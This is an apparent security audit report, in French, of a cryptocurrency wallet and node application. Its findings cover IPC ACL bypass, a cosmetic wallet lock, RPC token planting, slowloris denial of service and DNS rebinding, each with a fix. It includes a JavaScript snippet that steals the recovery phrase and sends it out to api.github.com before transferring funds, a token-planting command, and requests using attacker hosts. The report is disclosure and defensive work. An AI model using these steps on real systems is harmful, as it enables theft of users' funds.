# QUANTA — Audit de sécurité, surface applicative locale
**Périmètre** : JSON-RPC (`rpc.rs`), explorateur web embarqué (`explorer.html`), IPC Tauri
(`commands/`, `commands_v3.rs`, `lib.rs`, `capabilities/`, `tauri.conf.json`), frontend Svelte 5
(`src/`), stockage (`storage/db.rs`), gardien (`guardian.rs`).
**Hors périmètre** : P2P/gossip/DHT, consensus, ledger, primitives cryptographiques (`security/*`).
**Version auditée** : 3.15.1, protocole TORUS v9. Binaire testé : `target/debug/quanta-node`
(compilé le 13/08 22:27, postérieur à toutes les sources — donc à jour).
**Méthode** : lecture intégrale des fichiers du périmètre + exécution d'un nœud réel isolé
(`/tmp/qaudit_dd`, RPC sur `127.0.0.1:18645`, portefeuille persistant) et sondage par `curl` /
sockets bruts. Aucun fichier du dépôt n'a été modifié (`git status` propre en fin d'audit).

---

## 1) Résumé exécutif

1. **La surface IPC Tauri n'est protégée par rien.** Aucun manifeste ACL applicatif n'est généré
   (`gen/schemas/acl-manifests.json` ne contient que `core`, `process`, `updater`), donc Tauri 2.10.3
   **saute la vérification ACL pour les 34 commandes de l'application** (tauri-2.10.3
   `src/webview/mod.rs:1801`). N'importe quel JavaScript s'exécutant dans le webview appelle
   `get_recovery_phrase` et repart avec les 24 mots BIP39 — **l'autorité totale sur les fonds**.
   La CSP autorise `script-src 'self' 'unsafe-inline'`, ce qui annule la principale barrière anti-XSS.
2. **Le verrouillage du portefeuille n'existe pas.** Il n'y a **aucune** commande de verrouillage
   côté Rust. L'« auto-lock » est une seule ligne de front (`src/routes/+page.svelte:93`,
   `ready = false`) ; le `CryptoEngine` garde les clés ML-DSA et Ed25519 en RAM jusqu'à la fin du
   processus. Après « verrouillage », `ledger_transfer` et `get_recovery_phrase` marchent toujours.
   La ressaisie du mot de passe avant révélation de la phrase n'existe **que dans le front**
   (`Profile.svelte:103`) — le backend, lui, ne demande rien.
3. **Le jeton RPC peut être choisi par l'attaquant.** `RpcAuth::load_or_create` (`rpc.rs:165-172`)
   réutilise tel quel un `.cookie` préexistant de ≥ 32 caractères **sans vérifier ni corriger ses
   permissions**. J'ai planté un cookie `AAAA…` en 0644, redémarré le nœud, et le jeton planté a été
   accepté : il donne l'autorité complète sur `sendtoaddress` (dépense sans mot de passe).

Trois autres faits mesurés : `quanta.db` (coffre chiffré) est en **0644** ; 128 connexions
semi-ouvertes ouvertes en **0,02 s** rendent le RPC totalement indisponible ; le plugin updater est
enregistré mais **non autorisé** par la capacité — la mise à jour OTA est morte, donc il n'existe
aucun canal de correctif de sécurité.

---

## 2) Tableau des constats

| id | sévérité | ancre | résumé |
|----|----------|-------|--------|
| A1 | **CRITIQUE** | `src-tauri/src/lib.rs:205` + `src-tauri/capabilities/default.json:1` | Les 34 commandes applicatives échappent à l'ACL Tauri : tout JS du webview peut exfiltrer la phrase de récupération |
| A2 | **CRITIQUE** | `src/routes/+page.svelte:93` + `src-tauri/src/commands/identity.rs:172` | Le verrouillage du portefeuille est purement cosmétique ; aucune réauthentification côté Rust |
| A3 | **CRITIQUE** | `src-tauri/src/rpc.rs:167` | Plantation du cookie RPC par un processus local : jeton choisi par l'attaquant, permissions non réappliquées (PROUVÉ) |
| A4 | **HAUT** | `src-tauri/src/rpc.rs:759` | `sendtoaddress` dépense sans déverrouillage, sans plafond, sans confirmation : le cookie EST l'autorité de dépense (PROUVÉ) |
| A5 | **HAUT** | `src-tauri/src/rpc.rs:250` | Déni de service non authentifié : 128 connexions semi-ouvertes coupent le RPC en 0,02 s (PROUVÉ) |
| A6 | **HAUT** | `src-tauri/src/storage/db.rs:23` | `quanta.db` en 0644 : coffre chiffré + graine ML-DSA + wrap biométrique lisibles par tout processus local (PROUVÉ) |
| A7 | **HAUT** | `src-tauri/capabilities/default.json:8` | Updater et process enregistrés mais non autorisés : aucun canal de mise à jour de sécurité fonctionnel |
| A8 | **MOYEN** | `src-tauri/src/rpc.rs:204` | Aucune validation de `Host` → DNS rebinding : toute page web lit l'adresse, le solde et l'historique du nœud (PROUVÉ) |
| A9 | **MOYEN** | `src-tauri/src/commands/diagnostics.rs:34` | `ui_diag` : écriture disque arbitraire, non bornée, non limitée en débit, en 0644 (3,2 Mo observés) |
| A10 | **MOYEN** | `src-tauri/src/rpc.rs:626` | `listtransactions` : balayage O(hauteur) non annulable sous verrou de lecture — blocage des workers tokio (non prouvé empiriquement) |
| A11 | **MOYEN** | `src/lib/WalletSend.svelte:148` | L'écran de confirmation d'envoi n'affiche jamais l'adresse réellement créditée sur le chemin `@pseudo` |
| A12 | **MOYEN** | `src/lib/quanta.ts:137` | La phrase de 24 mots est déposée dans le presse-papier système (effacement à 45 s non garanti) |
| A13 | **MOYEN** | `src-tauri/tauri.conf.json:29` | CSP avec `script-src 'self' 'unsafe-inline'` : la CSP ne protège de rien |
| A14 | **BAS** | `src-tauri/src/rpc.rs:177` | Cookie créé avec l'umask puis chmod 0600 : fenêtre TOCTOU (non prouvée) |
| A15 | **BAS** | `src-tauri/src/explorer.html:116` | `esc()` n'échappe ni `'` ni backtick ; le test de non-régression `rpc.rs:883` ne vérifie qu'un motif littéral |
| A16 | **BAS** | `src-tauri/src/rpc.rs:325` | Réponses RPC/explorateur sans CSP, sans `nosniff`, sans `frame-ancestors` (PROUVÉ) |
| A17 | **BAS** | `src-tauri/src/rpc.rs:214` | Tout `Origin`, y compris même-origine, est refusé : aucun client navigateur ne peut utiliser les méthodes d'argent (PROUVÉ) |
| A18 | **BAS** | `src-tauri/src/bin/quanta-node.rs:42` | Mot de passe du portefeuille passé par variable d'environnement |
| A19 | **BAS** | `src-tauri/src/bin/quanta-node.rs:54` | Adresse de portefeuille du nœud journalisée en clair au niveau INFO |
| A20 | **BAS** | `src-tauri/src/commands/wallet.rs:58` | Montants transportés en `f64` sur l'IPC puis arrondis : le débit peut différer de la saisie |
| A21 | **BAS/info** | `src-tauri/src/guardian.rs:34` | Le seul bloc `unsafe` : justifié et borné, deux réserves mineures |
| A22 | **BAS** | `src-tauri/src/commands/identity.rs:28` | Minimum backend de 8 caractères contre 10 + chiffres côté front : c'est le backend qui fait foi |

---

## 3) Développement par constat

### A1 — CRITIQUE — Les 34 commandes IPC échappent totalement à l'ACL Tauri
**Ancres** : `src-tauri/src/lib.rs:205-246` (enregistrement), `src-tauri/capabilities/default.json:8`,
`src-tauri/gen/schemas/acl-manifests.json`, `src-tauri/gen/schemas/capabilities.json`,
`~/.cargo/registry/.../tauri-2.10.3/src/webview/mod.rs:1801-1829`.

**Ce qui est faux.** Tauri 2 ne vérifie l'ACL que dans deux cas, littéralement :

```rust
// tauri-2.10.3/src/webview/mod.rs:1800
// we only check ACL on plugin commands or if the app defined its ACL manifest
if (plugin_command.is_some() || has_app_acl_manifest) && ... && invoke.acl.is_none() { reject }
```

J'ai vérifié le manifeste généré :
`json.load("src-tauri/gen/schemas/acl-manifests.json").keys()` →
`['core', 'core:app', 'core:event', 'core:image', 'core:menu', 'core:path', 'core:resources',
'core:tray', 'core:webview', 'core:window', 'process', 'updater']`.
**Aucune clé applicative** ⇒ `has_app_acl_manifest == false` ⇒ pour toute commande qui ne commence
pas par `plugin:`, la branche de rejet n'est jamais prise et `run_invoke_handler` est appelé
directement. Cela vaut aussi bien pour `Origin::Local` que pour `Origin::Remote`.

La capacité unique est :
```json
{ "identifier": "main-capability", "local": true, "windows": ["main"], "permissions": ["core:default"] }
```
Elle donne l'illusion d'un périmètre restreint : elle ne restreint **rien** de ce qui touche à l'argent,
parce que ces commandes ne passent jamais par elle.

**Chemin d'exploitation concret.** Attaquant : n'importe quel code exécuté dans le webview —
XSS dans un rendu de donnée de chaîne, dépendance npm compromise (11 dépendances directes,
dont `qrcode-generator` et deux paquets de polices), extension d'outillage en dev, ou toute
navigation vers une origine tierce. Accès requis : exécution JS dans la fenêtre `main`.
Gain :

```js
const seed = await window.__TAURI_INTERNALS__.invoke("get_recovery_phrase");
// 24 mots BIP39 = graine ML-DSA de 32 octets = autorité de dépense complète, pour toujours
await fetch("https://api.github.com/x?d=" + encodeURIComponent(seed)); // connect-src l'autorise
await window.__TAURI_INTERNALS__.invoke("ledger_transfer", { to: attaquant, amount: 1000000 });
```

Note aggravante : `connect-src 'self' https://github.com https://api.github.com` — l'exfiltration
vers `github.com` est **explicitement permise** par la CSP.

**Impact chiffré.** Perte de 100 % du solde et de tout solde futur de la même adresse
(la graine ne se révoque pas). Plafond `ledger_transfer` : 1 000 000 QUANTA par appel
(`wallet.rs:70`), sans limite du nombre d'appels ; l'offre maximale du protocole est de
100 000 000 QUANTA (`max_supply_uqta = 100000000000000` µQTA, mesuré sur `getinfo`).

**Statut** : la lecture du code de Tauri et des manifestes générés est certaine (invariant lu).
Je n'ai **pas** exécuté l'application graphique pour tirer le `invoke` en vrai — voir §5.

**Correctif** : déclarer un manifeste ACL applicatif (`src-tauri/permissions/`) pour forcer
`has_app_acl_manifest == true`, puis n'autoriser explicitement que le strict nécessaire ; et
retirer `'unsafe-inline'` de `script-src`.

---

### A2 — CRITIQUE — Le verrouillage du portefeuille est purement cosmétique
**Ancres** : `src/routes/+page.svelte:81-100` (dont `:93`), `src-tauri/src/lib.rs:205-246`,
`src-tauri/src/commands/identity.rs:172-179`, `:464-476`, `src/lib/Profile.svelte:98-111`,
`src/routes/+page.svelte:105-120`.

**Ce qui est faux.** Le « verrouillage automatique après inactivité » est exactement ceci :

```js
// src/routes/+page.svelte:90
if (Date.now() - last > lockMin * 60_000) {
  ready = false;   // <- c'est tout le verrouillage
}
```

Recherche exhaustive côté Rust : il n'existe **aucune** fonction `lock_identity`, `lock_wallet`,
`clear_identity` ni équivalent ; la liste `invoke_handler!` (`lib.rs:205-246`) ne contient que des
`unlock_*`. Le `CryptoEngine` détenu par `AppState` (`lib.rs:99`) conserve donc la clé ML-DSA de
dépense et la clé Ed25519 de transport pendant toute la vie du processus.

Corollaire du même défaut : la réauthentification avant révélation de la phrase de récupération
n'est qu'une convention d'interface —

```js
// src/lib/Profile.svelte:103
await unlockIdentity(recoveryPass);   // re-vérifie le mot de passe
recoveryPhrase = await getRecoveryKey();
```

alors que la commande Rust ne vérifie rien :

```rust
// src-tauri/src/commands/identity.rs:172
pub async fn get_recovery_phrase(state: ...) -> Result<String, String> {
    let engine = state.crypto.lock().await;
    let seed = engine.get_pq_seed_bytes()?;      // aucun mot de passe demandé
    ...
}
```

**Chemin d'exploitation concret.** L'utilisateur laisse la machine « verrouillée » (écran
`AuthGate` affiché). Un malware local qui obtient l'exécution JS dans le webview, ou toute
autre voie vers l'IPC (cf. A1), appelle `get_recovery_phrase` puis `ledger_transfer`. Le verrou
affiché ne l'arrête pas. Il n'y a **aucun** signal, aucune confirmation, aucune fenêtre système.

Second chemin, plus discret : `was_guardian_reload` (`diagnostics.rs:54`) fait basculer l'app en
session restaurée **sans écran de déverrouillage** (`+page.svelte:108-120`). C'est cohérent avec
l'architecture (le coffre Rust est resté chaud) et donc ce n'est pas un contournement en soi —
mais cela documente que la conception assume que le front est le seul garde-barrière.

**Impact chiffré** : identique à A1 — 100 % des fonds, définitivement.

**Correctif** : une commande `lock_wallet` qui zeroize les clés dans `CryptoEngine`, appelée par
le timer d'inactivité ; et un vrai « re-auth pour opération sensible » côté Rust
(mot de passe obligatoire en argument de `get_recovery_phrase`, `get_recovery_key`,
et idéalement de `ledger_transfer` au-delà d'un seuil).

---

### A3 — CRITIQUE — Plantation du jeton RPC par un processus local (PROUVÉ)
**Ancre** : `src-tauri/src/rpc.rs:165-184`.

```rust
pub fn load_or_create(data_dir: &std::path::Path) -> std::io::Result<Self> {
    let path = data_dir.join(".cookie");
    if let Ok(existing) = std::fs::read_to_string(&path) {   // :167
        let t = existing.trim().to_string();
        if t.len() >= 32 {                                   // :169
            return Ok(Self { token: t });                    // <- aucun contrôle de permissions
        }
    }
    ...
    std::fs::write(&path, &token)?;                          // :177  (umask)
    #[cfg(unix)] { ... set_permissions(&path, from_mode(0o600))?; }   // :181 (après coup)
```

Le chemin de **réutilisation** ne vérifie ni le propriétaire, ni le mode, ni l'entropie du fichier.

**Preuve exécutée.** Nœud arrêté, cookie remplacé par un attaquant local, nœud redémarré :

```
=== cookie légitime avant ===
-rw-------  .cookie    86b934f64c05183cb2fb3dbd948de0ecdb2406235596e9deb4b13140d843440d
# l'attaquant écrit :  printf 'AAAA…(64)' > .cookie ; chmod 0644 .cookie
=== cookie APRES redémarrage du nœud ===
-rw-r--r--  .cookie    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
=== le jeton planté est-il accepté ? ===
{"id":1,"jsonrpc":"2.0","result":{"address":"qta1metylmty…","has_wallet":true,…}}
```

Deux conclusions : (a) le jeton **choisi par l'attaquant** est accepté ; (b) le mode 0644 est
conservé — le nœud ne réapplique jamais 0600, donc si l'attaquant préfère la discrétion il laisse
le cookie légitime mais en 0644 et **tous les utilisateurs locaux le lisent**.

**Chemin d'exploitation concret.** Attaquant : tout processus non privilégié tournant sous le même
compte (ou tout compte disposant de l'écriture dans le répertoire de données — qui est en **0755**,
cf. A6), typiquement un binaire téléchargé, une extension, un job cron. Il n'a besoin
d'**aucun** privilège root et d'**aucune** connaissance du mot de passe du portefeuille.
Gain : autorité RPC complète ⇒ `sendtoaddress` (cf. A4) ⇒ vidage du portefeuille du nœud.

**Correctif** : refuser un `.cookie` qui n'appartient pas au processus ou dont le mode ≠ 0600 ;
le régénérer à chaque démarrage ; créer le fichier avec `OpenOptions::new().mode(0o600)`
(ce qui supprime aussi A14).

---

### A4 — HAUT — `sendtoaddress` dépense sans déverrouillage, sans plafond (PROUVÉ)
**Ancre** : `src-tauri/src/rpc.rs:759-793`.

Le handler prend `address` + `amount_uqta`, verrouille le `CryptoEngine`, construit **et signe**
la transaction, puis diffuse les deux jambes (transfert + burn 1 %). Il n'existe :
- aucune notion de « portefeuille déverrouillé pour cette opération » ;
- aucun plafond de montant (contrairement à `ledger_transfer` qui plafonne à 1 000 000) ;
- aucune confirmation ni journalisation d'alerte.

Le portefeuille du démon est ouvert au démarrage par `QUANTA_WALLET_PASSWORD`
(`bin/quanta-node.rs:42-50`) et reste ouvert pour toute la vie du processus. **Le cookie est donc
la seule et unique autorité de dépense.**

**Preuve exécutée** (`Host` arbitraire, cookie légitime, aucun mot de passe fourni) :
```
POST / Authorization: Bearer <cookie>  Host: attacker.example
{"method":"sendtoaddress","params":{"address":"qta1…","amount_uqta":1}}
→ {"error":{"code":-32000,"message":"Minimum transfer: 0.01 QUANTA"}}
```
Le code `-32000` est une erreur **du ledger**, pas `-32001` (authentification). L'authentification
a donc été franchie et le constructeur de transaction a bien tourné : seul le montant plancher
de 0,01 QUANTA a arrêté l'appel. Avec `amount_uqta ≥ 10000` sur un nœud approvisionné,
la transaction est signée et diffusée.

**Impact chiffré** : 100 % du solde du nœud, en un appel, sans plafond.

**Correctif** : exiger un déverrouillage explicite et à durée limitée pour `sendtoaddress`
(`walletpassphrase` à la Bitcoin Core), plafonner par appel et par fenêtre de temps, journaliser
chaque dépense RPC en WARN.

---

### A5 — HAUT — Déni de service non authentifié du RPC (PROUVÉ)
**Ancres** : `src-tauri/src/rpc.rs:245` (`RPC_READ_TIMEOUT_SECS = 10`), `:250`
(`RPC_MAX_INFLIGHT = 128`), `:91-94` (refus au-delà du plafond), `:258-313` (`read_request`).

**Ce qui est faux.** Le plafond de 128 connexions en vol protège contre l'épuisement des
descripteurs de fichiers, mais il **transforme le slowloris en coupure de service** : chaque
connexion qui envoie un en-tête complet avec `Content-Length: 100` puis se tait immobilise un
permis pendant les 10 secondes entières du délai d'expiration, et toute connexion supplémentaire
est **fermée immédiatement** (`continue` à `rpc.rs:93`).

**Preuve exécutée** (`/tmp/qaudit_slow.py`, sockets bruts) :
```
128 connexions en vol ouvertes en 0.02s
CLIENT LEGITIME ->  exception: ConnectionResetError [Errno 54] Connection reset by peer
=== apres liberation ===
{"id":1,"jsonrpc":"2.0","result":1}
```
Le client légitime est purement et simplement rejeté. Le service revient une fois les sockets
attaquantes fermées.

**Chemin d'exploitation concret.** Coût de maintien : 128 sockets renouvelées toutes les 10 s,
soit **~13 connexions/seconde et ~13 kbit/s**. Attaquant : tout processus local, ou toute machine
du réseau si l'opérateur a lancé `--rpc-addr 0.0.0.0:8645` (option offerte, `quanta-node.rs:115`).
Gain : la surveillance de dépôts d'un intégrateur/exchange s'arrête, l'explorateur public tombe.
Aucune authentification requise, aucune trace au-delà d'un `log::debug!`.

**Correctif** : délai de lecture d'en-tête court et séparé (1-2 s) du délai de traitement,
plafond par adresse IP source, et politique de remplacement plutôt que de refus.

---

### A6 — HAUT — Le coffre chiffré est lisible par tout le monde sur la machine (PROUVÉ)
**Ancres** : `src-tauri/src/storage/db.rs:23-33` (`Database::new`, aucun `set_permissions`),
`src-tauri/src/node_runtime.rs:74-93` (`open_db`, `create_dir_all` sans mode),
`src-tauri/src/commands/identity.rs:52-57` (le coffre y est écrit).

**Mesure sur le répertoire de données réel de l'utilisateur** :
```
/Users/alex/Library/Application Support/quanta-protocol
drwxr-xr-x   .                       <- répertoire 0755
-rw-r--r--   quanta.db      4.3 Mo   <- 0644
-rw-r--r--   ui-diag.log    3.2 Mo   <- 0644
```
et sur le nœud d'audit fraîchement créé :
```
-rw-------  .cookie      <- 0600  (bon)
-rw-------  node_key     <- 0600  (bon)
-rw-r--r--  quanta.db    <- 0644  (mauvais)
```

`quanta.db` contient : la table `keypairs` (clé secrète Ed25519 chiffrée AES-256-GCM) et la table
`state_snapshots` avec la clé `pq_identity_v1` (**graine ML-DSA de 32 octets, chiffrée**, celle qui
contrôle les fonds — `identity.rs:56, 66-73`) et la clé `biometric_wrap_v1`.

**Chemin d'exploitation concret.** Attaquant : tout autre utilisateur local, tout processus tournant
sous un autre compte, toute application macOS non sandboxée, toute sauvegarde/synchronisation
cloud du dossier. Il copie `quanta.db` et attaque le mot de passe hors ligne. Le mur est
Argon2id (`security/cipher.rs:16` : `Params::new(64*1024, 3, 4, Some(32))` — 64 MiB, t=3, p=4),
ce qui est un bon paramétrage. **Mais** le backend n'exige que **8 caractères**
(`identity.rs:28`, `:46`, `:207`) alors que le front en réclame 10 avec chiffres
(`Welcome.svelte:46`) — et c'est le backend qui fait foi, notamment pour le démon lancé avec
`QUANTA_WALLET_PASSWORD`. Un mot de passe de 8 caractères alphanumériques minuscules
(~41 bits) reste hors de portée d'un attaquant modeste avec ce KDF, mais un mot de passe humain
courant (mot du dictionnaire + suffixe, ~25-30 bits) tombe en heures sur un GPU.

**Correctif** : `set_permissions(0o600)` sur `quanta.db` (et 0700 sur le répertoire) au moment de
l'ouverture ; aligner le minimum backend sur le front.

---

### A7 — HAUT — La mise à jour OTA ne peut pas fonctionner : plus aucun canal de correctif
**Ancres** : `src-tauri/src/lib.rs:187-188` (plugins enregistrés),
`src-tauri/capabilities/default.json:8` (`"permissions": ["core:default"]`),
`src/lib/Settings.svelte:2-3, 35, 64` (le front les appelle).

`core:default` s'étend exactement en (lu dans `gen/schemas/acl-manifests.json`) :
`core:path:default, core:event:default, core:window:default, core:webview:default, core:app:default,
core:image:default, core:resources:default, core:menu:default, core:tray:default`.
**Ni `updater:default` ni `process:default`.**

Or, contrairement aux commandes applicatives (cf. A1), les commandes **de plugin** sont, elles,
soumises à l'ACL : `plugin_command.is_some()` est vrai ⇒ la branche de rejet s'applique ⇒
`check()` et `relaunch()` sont rejetés avec `Command plugin:updater|check not allowed by ACL`.

**Conséquence de sécurité.** L'endpoint est pourtant sain — je l'ai vérifié :
`https://github.com/nobodyohm-web/Quanta/releases/latest/download/latest.json` → HTTP 200,
dépôt existant, HTTPS, clé publique minisign présente dans `tauri.conf.json:36`. Le mécanisme
de signature est correctement configuré. Mais il est **inatteignable depuis le front** : aucun
utilisateur ne recevra jamais de correctif par ce chemin. Pour une application alpha qui porte
des fonds et qui présente les défauts A1-A6, l'absence de canal de patch est un facteur
d'aggravation direct de tous les autres constats.

Détail cosmétique associé : `Cargo.toml` déclare `repository = ".../nobodyohm-web/Torus"`
(HTTP 301) tandis que l'updater et `package.json` pointent sur `.../nobodyohm-web/Quanta`.

**Correctif** : ajouter `"updater:default"` et `"process:default"` à la capacité (et *seulement*
ces deux-là), puis tester le flux de bout en bout.

---

### A8 — MOYEN — Aucune validation de `Host` : DNS rebinding (PROUVÉ)
**Ancres** : `src-tauri/src/rpc.rs:204-240` (`auth_rejection` — vérifie `origin`, `content-type`,
`authorization` ; jamais `host`), `:206-208` (toute la surface de lecture est explicitement non
protégée), `:469` (`getinfo` renvoie l'adresse du portefeuille du nœud).

**Preuves exécutées.**
```
# aucun en-tête d'authentification, aucun Content-Type, aucune Origin :
POST / {"method":"getinfo"}
→ {"address":"qta1metylmty4lnfgvrwyy8q7rt5aa8xqrj9kdd5rpn694ts6vapqg8q35tc86",
   "node_id":"b3ce87c6df4896a1941bab34ce8b90d942fec024f2d6c1ad56de2184fd3e1b8e", …}

# requête « simple » de navigateur, origine étrangère, même résultat :
POST / Content-Type: text/plain;charset=UTF-8   Origin: https://evil.example
→ (mêmes données)

# Host arbitraire accepté :
POST / Host: attacker.example  {"method":"getbalance","params":{"address":"qta1…"}}
→ {"address":"qta1metyl…","spendable_uqta":0,"staked_uqta":0}
```

**Chemin d'exploitation concret.** L'opérateur d'un nœud visite une page web quelconque. Le
domaine de l'attaquant a un TTL DNS de 1 s et bascule vers `127.0.0.1`. Après rebinding, la page
est **même-origine** avec `http://attacker.tld:8645` : le navigateur laisse lire les réponses.
Les méthodes d'argent, elles, restent refusées (l'en-tête `Origin` est alors `http://attacker.tld:8645`,
non vide → rejet, cf. A17 — cette défense **tient**). Mais toute la surface de lecture est ouverte :
- `getinfo` → **l'adresse `qta1…` du portefeuille de l'opérateur** et son `node_id` Iroh,
- `getbalance` → son solde disponible et son enjeu,
- `listtransactions` → jusqu'à 1000 transactions entrantes/sortantes avec montants et hauteurs,
- `getmempool`, `getvalidators`, `getblock`.

Gain : dé-anonymisation complète de l'opérateur d'un nœud (corrélation adresse ↔ IP ↔ identité de
navigation), sur une monnaie qui se revendique souveraine. Coût : une page web et un domaine.

Ne concerne que le démon `quanta-node` : l'application de bureau **ne sert pas** le RPC
(`grep rpc::serve` ne remonte que `bin/quanta-node.rs:80`).

**Correctif** : refuser tout `Host` qui n'est ni `127.0.0.1[:port]`, ni `localhost[:port]`, ni
l'adresse de liaison configurée ; et étendre l'exigence de jeton à `getbalance`,
`listtransactions` et `getinfo` quand le nœud n'est pas en mode `--public`.

---

### A9 — MOYEN — `ui_diag` : écriture disque arbitraire depuis le webview
**Ancres** : `src-tauri/src/commands/diagnostics.rs:20-28` (`ui_diag_write`), `:33-36` (`ui_diag`).

```rust
#[tauri::command]
pub async fn ui_diag(msg: String) { ui_diag_write(&msg); }        // :34
// ...
let path = node_runtime::default_data_dir().join("ui-diag.log");  // :24
if let Ok(mut f) = OpenOptions::new().create(true).append(true).open(path) {
    let _ = writeln!(f, "[{}] {}", epoch_secs(), msg);            // :26
}
```

Aucune borne sur la longueur de `msg`, aucune limitation de débit, aucune rotation, aucun mode
de création restrictif. Combiné à A1 (commande non protégée par l'ACL), c'est une primitive
d'écriture disque contrôlée par l'attaquant. Le fichier réel de l'utilisateur mesure **3,2 Mo pour
2 413 lignes** (certaines lignes ~10 ko) et est en **0644**.

Contenu observé : hachages de blocs et de transactions complets, montants minés au µQTA près,
erreurs JS avec pile — soit un journal forensique de l'activité financière, lisible par tout
processus local. Aucun mot de passe ni aucune graine n'y figure (vérifié, cf. §4).

**Chemin d'exploitation.** (a) Remplissage du disque à la vitesse de l'IPC ; (b) injection de
lignes falsifiées dans le journal de preuve du projet (il n'y a aucun échappement de saut de
ligne : `msg` peut contenir `\n` et fabriquer de fausses entrées horodatées) ; (c) fuite passive
de l'activité financière vers les autres utilisateurs de la machine.

**Correctif** : tronquer `msg` (p. ex. 4 ko), remplacer les caractères de contrôle, limiter le
débit, faire tourner le fichier, et le créer en 0600.

---

### A10 — MOYEN — `listtransactions` : balayage non annulable sous verrou (non prouvé empiriquement)
**Ancre** : `src-tauri/src/rpc.rs:609-656`, boucle `:626`.

```rust
let ledger = state.node.ledger.read().await;     // :613  verrou pris
let from_height = params.get("from_height")...   // :616  entièrement contrôlé par l'appelant
'scan: for i in from_height..=height {           // :626  aucun `.await` dans le corps
    if let Some(b) = ledger.block_at(i) { for tx in &b.transactions { ... } }
}
```

Deux invariants lus dans le code : (1) `from_height` n'a **aucun plancher** — un appelant met 0 ;
(2) la boucle ne contient **aucun point d'attente**, donc le `tokio::time::timeout` de
`serve` (`rpc.rs:100`) ne peut pas l'interrompre : le `Future` n'est annulable qu'à un `await`.
Le `limit` plafonné à 1000 borne la **sortie**, pas le **balayage** : sur une adresse sans
transaction, la boucle parcourt toute la chaîne.

Conséquence : un appel bloque un thread de travail tokio jusqu'à la fin du balayage, en tenant le
verrou de lecture du ledger. Avec `RPC_MAX_INFLIGHT = 128` requêtes simultanées, tous les threads
de travail sont saturés, ce qui gèle aussi le minage, le gossip et le vote de finalité — qui
partagent le même runtime (`node_runtime.rs:108-121`).

**Non prouvé** : ma chaîne de test était à la hauteur 1, je n'ai donc pas pu **mesurer** le coût
par bloc. Le constat repose sur la lecture des invariants ci-dessus, qui eux sont certains.

**Correctif** : `from_height = max(from_height, height - N)`, borne dure sur le nombre de blocs
balayés par appel, et `tokio::task::yield_now()` périodique (ou déplacement sur
`spawn_blocking`).

---

### A11 — MOYEN — La confirmation d'envoi ne montre jamais l'adresse créditée (chemin `@pseudo`)
**Ancres** : `src/lib/WalletSend.svelte:79-102` (résolution), `:102` (construction de l'aperçu),
`:148` (affichage).

```js
to = resolved; label = "@" + uname;                                        // :86
preview = { toLabel: label, to, amount: amt, net, burn, balanceAfter };    // :102
// ...
<span class="st-v">{preview.toLabel}</span>                                // :148
```

L'écran « vérifie avant de signer » affiche `@bob`. L'adresse `preview.to` réellement créditée —
résultat de `resolve_username`, c'est-à-dire d'un registre CRDT propagé par gossip — n'est
**jamais** montrée à l'utilisateur, ni en entier ni en forme courte, ni avant ni après signature.

**Chemin d'exploitation.** Un adversaire qui parvient à faire gagner sa revendication `@bob`
dans la résolution de conflit du registre (mécanisme hors de mon périmètre — je ne me prononce
pas sur sa solidité) obtient un détournement **totalement invisible** : l'utilisateur relit
« @bob », confirme, et signe vers l'adresse de l'attaquant. Le seul contrôle affiché
(`connection_code`, `commands_v3.rs:152-159`) n'est ni recalculé ni montré sur cet écran.

**Correctif** : afficher toujours l'adresse `qta1…` de destination (au minimum la forme courte
plus le code de connexion) sur l'écran de confirmation, quel que soit le chemin de saisie.

---

### A12 — MOYEN — La phrase de récupération passe par le presse-papier système
**Ancres** : `src/lib/quanta.ts:137-147`, `src/lib/Profile.svelte:113-119`.

```js
export async function copySensitive(text, ttlMs = 45_000) {
  await navigator.clipboard.writeText(text);
  setTimeout(async () => {
    try { const cur = await navigator.clipboard.readText();
          if (cur === text) await navigator.clipboard.writeText(""); }
    catch { /* clipboard read unavailable — do nothing */ }
  }, ttlMs);
}
```

L'intention (effacement différé) est bonne et documentée. Mais : (a) sur macOS le presse-papier
est partagé entre **tous** les processus de la session et synchronisé par Universal Clipboard vers
les appareils iCloud voisins — l'exposition est immédiate et hors du contrôle de l'application ;
(b) le nettoyage repose sur `navigator.clipboard.readText()`, dont WKWebView refuse en général
l'accès sans geste utilisateur direct : la branche `catch` ne fait alors **rien**, et la graine
reste dans le presse-papier indéfiniment. **Non prouvé** : je n'ai pas exécuté le webview pour
observer laquelle des deux branches est prise.

**Correctif** : ne pas proposer la copie de la phrase du tout (transcription manuelle), ou au
minimum écraser inconditionnellement le presse-papier au bout du délai plutôt que sous condition
de relecture.

---

### A13 — MOYEN — CSP : `script-src 'self' 'unsafe-inline'`
**Ancre** : `src-tauri/tauri.conf.json:29`.
```
default-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self';
img-src 'self' data: blob:; script-src 'self' 'unsafe-inline';
connect-src 'self' https://github.com https://api.github.com
```

`'unsafe-inline'` dans `script-src` **annule** la protection anti-XSS de la CSP : tout
`<script>…</script>` injecté et tout gestionnaire d'événement en attribut s'exécutent. Il n'y a
pas non plus de `frame-ancestors`, ni de `form-action`, ni de `navigate-to`/`base-uri`.

Ce que ça coûte **exactement dans cette application** : l'app affiche en permanence des données
venues de la chaîne et du réseau (adresses `from`/`to`, hachages, `display_name` de pairs, `@pseudo`,
montants). Aujourd'hui, ces données sont rendues via l'interpolation Svelte `{...}`, qui échappe
automatiquement — donc **il n'y a pas d'XSS exploitable en l'état** (vérifié, cf. §4). La CSP
n'est donc pas ce qui vous protège aujourd'hui : c'est Svelte. Le jour où un développeur écrit
un `{@html}` sur une donnée de chaîne (il y en a déjà 17 dans le code, tous sur des chaînes
i18n statiques), la CSP ne rattrapera rien, et A1 transforme cet XSS en vol de graine.
`connect-src` autorise en prime `https://api.github.com`, un canal d'exfiltration prêt à l'emploi.

**Correctif** : retirer `'unsafe-inline'` de `script-src` (Tauri injecte des nonces si on ne le
force pas), ajouter `frame-ancestors 'none'`, `base-uri 'none'`, `form-action 'none'`, et
restreindre `connect-src` à `'self'`.

---

### A14 — BAS — Fenêtre TOCTOU à la création du cookie
**Ancre** : `src-tauri/src/rpc.rs:177-182`. `std::fs::write` crée le fichier avec
`0666 & ~umask` (soit 0644 avec l'umask 022 mesuré sur la machine), et le `set_permissions(0o600)`
n'intervient qu'**après** l'écriture du jeton. Un processus local qui surveille le répertoire peut
lire le jeton dans cette fenêtre. **Non prouvé** — la fenêtre est de l'ordre de la microseconde et
je n'ai pas monté de course. Le correctif est de toute façon trivial
(`OpenOptions::new().create_new(true).mode(0o600)`).

---

